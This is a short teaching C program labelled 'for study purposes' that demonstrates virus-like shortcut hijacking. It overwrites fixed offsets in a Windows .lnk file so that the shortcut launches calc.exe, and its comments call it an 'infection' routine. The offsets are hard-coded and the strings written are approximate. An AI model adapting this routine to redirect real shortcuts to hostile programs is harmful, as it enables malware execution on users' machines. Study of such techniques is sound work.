/* Marcus Botacin
 * Piece of Code for study purposes
 * Virus-like behavior
 * patch routine which turns an *.lnk file into a calc.exe shortcut
 */

/* basic includes */
#include<stdio.h>

/* you can use it as your "infection" routine */
int main(int argc, char *argv[])
{
	/* open file as binary
	/* receiving *.lnk as argv[1] */
	FILE *p=fopen(argv[1],"r+b");

	/* Positioning and Patching */

	/* first block */
	fseek(p,0x131,SEEK_SET);
	fprintf(p,"calc.exe...");
	/* second block */
	fseek(p,0x167,SEEK_SET);
	fprintf(p,"c.a.l.c...e.x.e.......");
	/* third block */
	fseek(p,0x1c6,SEEK_SET);
	fprintf(p,"calc.exe...");
	/* fourth block */
	fseek(p,0x20F,SEEK_SET);
	fprintf(p,"c.a.l.c...e.x.e.......");
	/* fifth block */
	fseek(p,0x38C,SEEK_SET);
	fprintf(p,"c.a.l.c...e.x.e.......");
	/* sixth block */
	fseek(p,0x461,SEEK_SET);
	fprintf(p,"c.a.l.c...e.x.e.......");

	/* it's over! */
	fclose(p);
	return 0;
}
